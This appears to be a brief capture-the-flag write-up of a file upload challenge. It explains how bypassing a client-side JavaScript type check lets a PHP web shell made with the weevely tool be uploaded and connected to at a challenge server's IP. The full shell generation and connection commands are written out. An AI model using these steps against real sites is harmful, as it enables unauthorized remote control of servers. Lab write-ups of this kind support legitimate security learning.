# upload1

![Screenshot from 2021-07-24 23-17-41](https://user-images.githubusercontent.com/87865134/126874658-e619afd5-8bf4-4750-b0db-ff742c98b0db.png)

- **Maybe file upload vulnerability**
- **Test upload file** ***.php***
  - > can't upload file .php 

![Screenshot from 2021-07-24 23-19-21](https://user-images.githubusercontent.com/87865134/126874712-f03d8669-c3a6-4476-b39c-e094644872d7.png)

- **View source code and detect that application use JavaScript to check type of file upload**
  - > Easy to bypass 
 
- **Create shell.php**
  - > using ***weevely*** tool: `weevely generate 123456 shell.php`

- **Upload file and use weevely to connect**
  - `weevely http://111.200.241.244:52749/upload/1627143863.shell.php  123456`

![Screenshot from 2021-07-24 23-26-32](https://user-images.githubusercontent.com/87865134/126874864-44f65981-046d-4d2b-99b4-e586a3c1a091.png)

- **Description:**
  - > category: file upload 
